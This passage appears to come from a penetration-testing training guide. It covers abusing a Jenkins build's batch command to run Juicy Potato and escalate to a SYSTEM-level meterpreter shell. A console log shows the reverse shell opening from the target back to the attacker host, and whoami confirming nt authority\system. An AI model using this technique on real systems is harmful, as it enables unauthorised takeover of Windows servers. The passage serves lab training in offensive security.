build and the new build at once. While this isn't necessary, it is nice to have a fallback to the old low-privilege shell if needed.

![](bbox=[0.12, 0.15, 0.88, 0.68])

*Figure 372: Configuring the Batch Command to run Juicy Potato*

Once the configuration is saved, we select *Build Now* and wait for the meterpreter shell.

The build will show as failed, however, if we watch msfconsole, we still obtain a SYSTEM shell.

```
[*] Sending stage (180291 bytes) to 10.11.1.250
[*] Meterpreter session 4 opened (10.11.1.8:80 -> 10.11.1.250:3261) at 15:03:00

meterpreter > shell
. . .

C:\Windows\system32>whoami
whoami
nt authority\system
```